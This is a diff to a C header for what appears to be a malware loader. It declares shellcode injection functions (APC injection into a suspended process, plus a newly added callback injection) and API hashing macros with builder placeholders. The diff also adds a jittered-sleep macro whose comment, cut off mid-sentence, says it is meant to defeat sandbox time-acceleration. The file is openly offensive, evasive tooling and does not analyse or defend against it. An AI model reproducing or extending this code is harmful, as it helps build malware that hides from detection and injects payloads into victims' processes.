@@ -1,14 +1,20 @@
 #pragma once
 #include <stdint.h>
+#include <stdlib.h>
 
 // API Hashing Part
 #define HASHA(API)		(HashStringDjb2A((PCHAR) API))
 #define INITIAL_HASH	#-INITIAL_HASH_VALUE-#  
 #define INITIAL_SEED	#-INITIAL_SEED_VALUE-# 
 
+// Jittered sleep. uses WaitForSingleObject so sandbox time-acceleration
+#define JITTER_SLEEP(ms) \
+    WaitForSingleObject(GetCurrentProcess(), (DWORD)((ms) + (rand() % ((ms) / 2 + 1))))
+
 BOOL GetContent(OUT PBYTE* pPayload, OUT SIZE_T* sSizeOfPayload);
 BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread);
 BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress);
+BOOL CallbackInjection(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress);
 HMODULE GetModuleHandleH(DWORD dwModuleNameHash);
 FARPROC GetProcAddressH(HMODULE moduleHandle, DWORD hash);
 
